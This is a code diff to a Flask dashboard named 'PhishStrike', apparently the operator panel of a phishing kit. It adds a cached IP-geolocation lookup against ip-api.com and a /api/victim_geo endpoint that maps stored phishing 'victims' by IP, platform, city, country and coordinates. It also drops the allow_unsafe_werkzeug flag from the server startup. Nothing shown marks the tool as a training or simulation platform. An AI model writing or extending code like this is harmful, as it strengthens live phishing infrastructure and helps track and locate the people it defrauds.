@@ -2,11 +2,15 @@
 PhishStrike - Dashboard Flask Application
 """
 
-import sys
+import json as _json
 import os
 import io
 import math
+import time
+import sys
+import urllib.request
 from datetime import datetime
+from functools import lru_cache
 
 from flask import Flask, render_template, jsonify, send_file, request
 from flask_socketio import SocketIO
@@ -23,6 +27,28 @@ app.config["SECRET_KEY"] = Config.SECRET_KEY
 
 _cors = Config.cors_origin_list() or "*"
 socketio = SocketIO(app, cors_allowed_origins=_cors, async_mode="threading")
+
+# ─── IP Geolocation Cache ──────────────────────────────────────────────────
+
+_geo_cache: dict[str, dict] = {}
+_GEO_TTL = 3600  # 1 hour cache
+
+
+def _geo_lookup(ip: str) -> dict:
+    now = time.time()
+    if ip in _geo_cache and now - _geo_cache[ip]["ts"] < _GEO_TTL:
+        return _geo_cache[ip]["data"]
+    try:
+        url = f"http://ip-api.com/json/{ip}?fields=status,lat,lon,city,country"
+        with urllib.request.urlopen(url, timeout=3) as resp:
+            data = _json.loads(resp.read().decode("utf-8"))
+            if data.get("status") == "success":
+                result = {"lat": data["lat"], "lng": data["lon"], "city": data.get("city", ""), "country": data.get("country", "")}
+                _geo_cache[ip] = {"ts": now, "data": result}
+                return result
+    except Exception:
+        pass
+    return {"lat": 0, "lng": 0, "city": "", "country": ""}
 
 
 def _validate_internal_key():
@@ -62,6 +88,29 @@ def get_victims():
 @app.route("/api/stats")
 def get_stats():
     return jsonify(database.get_stats())
+
+
+@app.route("/api/victim_geo")
+def get_victim_geo():
+    victims = database.get_all_victims()
+    seen = set()
+    result = []
+    for v in victims:
+        ip = v[4]
+        if ip and ip not in seen and ip != "Unknown":
+            seen.add(ip)
+            geo = _geo_lookup(ip)
+            if geo["lat"] or geo["lng"]:
+                result.append({
+                    "id": v[0],
+                    "platform": v[1],
+                    "ip": ip,
+                    "lat": geo["lat"],
+                    "lng": geo["lng"],
+                    "city": geo["city"],
+                    "country": geo["country"],
+                })
+    return jsonify(result)
 
 
 @app.route("/api/delete/<int:victim_id>", methods=["POST"])
@@ -436,11 +485,11 @@ if __name__ == "__main__":
             log.warning("Waitress not installed — falling back to SocketIO server.")
             socketio.run(
                 app, host=host, port=port,
-                debug=Config.DEBUG, allow_unsafe_werkzeug=True,
+                debug=Config.DEBUG,
             )
     else:
         log.info("Runtime: Flask-SocketIO (live WebSocket updates)")
         socketio.run(
             app, host=host, port=port,
-            debug=Config.DEBUG, allow_unsafe_werkzeug=True,
+            debug=Config.DEBUG,
         )
